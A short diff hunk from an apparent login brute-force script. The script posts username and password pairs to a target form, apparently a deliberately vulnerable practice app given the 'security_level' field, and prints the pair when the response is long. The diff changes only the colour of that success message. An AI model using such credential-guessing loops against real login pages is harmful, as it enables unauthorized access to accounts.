@@ -88,7 +88,7 @@ try:
 			r = requests.post(targetURL, data={'login': n, 'password': w, 'security_level': '0', 'form': 'submit'})
 			if len(r.text) > 4086:
 				# Adding a little spice to our success output
-				print(f"[!] SUCCESS!!! \033[31m{n}:{w}\033[0m")
+				print(f"[!] SUCCESS!!! \033[41m{n}:{w}\033[0m")
 				break
 
 except:
